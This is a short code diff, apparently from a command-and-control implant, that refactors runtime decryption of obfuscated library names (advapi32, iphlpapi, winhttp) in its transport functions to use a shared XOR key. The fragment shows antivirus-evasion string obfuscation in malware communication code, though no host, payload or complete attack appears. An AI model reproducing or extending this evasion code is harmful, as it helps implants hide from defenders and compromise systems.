@@ -61,13 +61,11 @@ BOOL TransportInit( ) {
     UCHAR s_advapi32[] = S_ADVAPI32;
     UCHAR s_iphlpapi[] = S_IPHLPAPI;
 
-    UCHAR s_xkey[] = S_XK;
-
     UCHAR d_advapi32[14] = {0};
     UCHAR d_iphlpapi[14] = {0};
 
-    ROL_AND_DECRYPT((CONST CHAR *)s_advapi32, sizeof(s_advapi32), 1, d_advapi32, (CONST CHAR *)s_xkey);
-    ROL_AND_DECRYPT((CONST CHAR *)s_iphlpapi, sizeof(s_iphlpapi), 1, d_iphlpapi, (CONST CHAR *)s_xkey);
+    ROL_AND_DECRYPT((CONST CHAR *)s_advapi32, sizeof(s_advapi32), 1, d_advapi32, (CONST CHAR *)Instance.XOR_KEY);
+    ROL_AND_DECRYPT((CONST CHAR *)s_iphlpapi, sizeof(s_iphlpapi), 1, d_iphlpapi, (CONST CHAR *)Instance.XOR_KEY);
 
     HANDLE p_kernel32 = Instance.Handles.Kernel32Handle;
 
@@ -301,11 +299,10 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     BOOL    Successful      = FALSE;
 
 #if CONFIG_OBFUSCATION == TRUE
-    unsigned char s_xk[] = S_XK;
-    unsigned char s_string[] = S_WINHTTP;
-    unsigned char winhttp[sizeof(s_string)] = { 0 };
+    UCHAR s_string[] = S_WINHTTP;
+    UCHAR winhttp[sizeof(s_string)] = { 0 };
 
-    ROL_AND_DECRYPT((char *)s_string, sizeof(s_string), 1, winhttp, s_xk);
+    ROL_AND_DECRYPT((CHAR *)s_string, sizeof(s_string), 1, winhttp, Instance.XOR_KEY);
 
 
     //winhttp[11] = 0x00;
